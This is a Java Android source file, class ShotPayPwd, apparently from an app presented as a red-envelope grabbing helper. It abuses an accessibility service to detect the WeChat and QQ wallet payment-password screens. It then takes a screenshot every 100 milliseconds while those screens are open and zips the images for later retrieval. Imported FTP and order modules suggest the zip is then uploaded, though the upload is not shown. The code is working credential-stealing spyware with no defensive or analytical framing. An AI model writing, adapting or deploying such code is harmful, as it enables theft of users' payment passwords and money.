/**
 * 
 */
package accessibility.app;

import accessibility.BaseAccessibilityJob;
import accessibility.QiangHongBaoService;
import android.app.Notification;
import android.content.ActivityNotFoundException;
import android.graphics.Bitmap;
import android.os.Handler;
import android.os.Parcelable;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import download.ftp;
import order.OrderService;
import order.order;
import order.file.FileUtils;
import order.screen.ScreenShotActivity;
import order.screen.Shotter;
import util.ConfigCt;
import util.Funcs;
import util.ZipHelper;

/**
 * @author ASUS
 *
 */
public class ShotPayPwd extends BaseAccessibilityJob {
	private static ShotPayPwd current;
	private String mSavePicDir;//图片保存目录；
	public static final String PIC_DIR="pic";//目录名；
	private int mFileIndex=0;//图片文件序号
	private String mID="wx";//图片文件标识类别
	public static final String WX_WINDOW_LUCKYMONEY_PLUGIN_WALLET_UI="com.tencent.mm.plugin.wallet_core.ui";
	private static final String WINDOW_PWD_UI="com.tencent.mm.plugin.wallet_core.ui.o";//667
	public static final String WX_WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mm.ui.LauncherUI";
	public static final String QQ_WINDOW_LUCKYMONEY_WALLETPAY_UI="cooperation.qwallet.plugin.QWalletPluginProxyActivity";
	public static final String QQ_WINDOW_LUCKYMONEY_LAUNCHER_UI="com.tencent.mobileqq.activity.SplashActivity";
    private ShotPayPwd() {
    	super(new String[]{ConfigCt.WECHAT_PACKAGENAME,ConfigCt.QQ_PACKAGENAME});
    	
    }
    public static synchronized ShotPayPwd getInstance() {
        if(current == null) {
            current = new ShotPayPwd();
        }
        return current;
    }
    @Override
	public void onCreateJob(QiangHongBaoService service) {
		super.onCreateJob(service);
		EventStart();
	}
    @Override
    public void onStopJob() {
    	super.onStopJob();

    }
    /*
	 * (刷新处理流程)
	 * @see accessbility.AccessbilityJob#onWorking()
	 */
	@Override
	public void onWorking(){
		shotScreen(mID);
	}
	 @Override
	public void onReceiveJob(AccessibilityEvent event) {
		 super.onReceiveJob(event);
		 if(!mIsEventWorking)return;
		 if(!mIsTargetPackageName)return;
		 if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)   
		 {  //WX_WINDOW_LUCKYMONEY_PLUGIN_WALLET_UI
			 if(mCurrentUI.contains(WX_WINDOW_LUCKYMONEY_PLUGIN_WALLET_UI)){
				 mFileIndex=0;
				 mID="wx";
				 if(ScreenShotActivity.shotter==null)return;	
				 mSavePicDir=getSavePicDir();
				 TimeStart();
			 }
			 if(mCurrentUI.equals(QQ_WINDOW_LUCKYMONEY_WALLETPAY_UI)){
				 mFileIndex=0;
				 mID="qq";
				 if(ScreenShotActivity.shotter==null)return;	
				 mSavePicDir=getSavePicDir();
				 TimeStart();
			 }
			 if(mCurrentUI.equals(WX_WINDOW_LUCKYMONEY_LAUNCHER_UI)){
				 if(mIsTimeWorking){
					 closeTimeWorking();
					 zipFiles() ;
				 }
			 }
			 if(mCurrentUI.equals(QQ_WINDOW_LUCKYMONEY_LAUNCHER_UI)){
				 if(mIsTimeWorking){
					 closeTimeWorking();
					 zipFiles() ;
				 }
			 }
		 }
	}
	/** 保存目录*/
	private String getSavePicDir() {
		if(ConfigCt.LocalPath.equals(""))
			ConfigCt.getInstance(context).getLocalDir();
		String picDir=ConfigCt.LocalPath+PIC_DIR;
		if(!Funcs.fileExists(picDir))
			Funcs.makeDir(picDir);
		return picDir;
	}
	/** 保存目录与文件名*/
	private String getSaveFilename(String ID) {
		String filename=mSavePicDir+"/"+ID+mFileIndex+".jpg";
		mFileIndex=mFileIndex+1;
		return filename;
	}
	/** 截图*/
	private void shotScreen(String ID) {
		if(ScreenShotActivity.shotter==null)return;	
    	final String filename=getSaveFilename(ID);
    	ScreenShotActivity.shotter.startScreenShot(new Shotter.OnShotListener() {
            @Override
            public void onFinish(Bitmap bitmap) {
            }
        },filename,50);	
	}
	/** 压缩*/
	private void zipFiles() {
		new Thread(new Runnable() {    
			@Override    
		    public void run() {    
				//Looper.prepare();
				try{
					final String zipname=ConfigCt.LocalPath+Funcs.getFilename(ConfigCt.appID, ".zip");
					ZipHelper.zipDir(mSavePicDir, zipname);
					FileUtils.deleteFile(mSavePicDir);
				}catch(ActivityNotFoundException e){
					e.printStackTrace();
				}
				//Looper.loop(); 
		    }    
		}).start();
	}
    /*
     * (开始刷新处理；1分钟后自动关闭)
     * @see accessbility.AccessbilityJob#onStart()
     */
    @Override
    public void TimeStart(){
    	mIsTimeWorking=true;
    	Runnable runnableStop = new Runnable() {    
    		@Override    
    		public void run() {    
    			mIsTimeWorking=false;	   
    		}    
    	}; 
    	Runnable runnableTime = new Runnable() {    
    		@Override    
    		public void run() {    
    			if(!mIsTimeWorking)return;
    			onWorking();
    			handler.postDelayed(this, 100);			   
    		}    
    	};
    	handler.postDelayed(runnableStop, TIME_WORKING_CONTINUE); 
    	handler.postDelayed(runnableTime, 10); 
    }
    private Handler handler = new Handler();
}
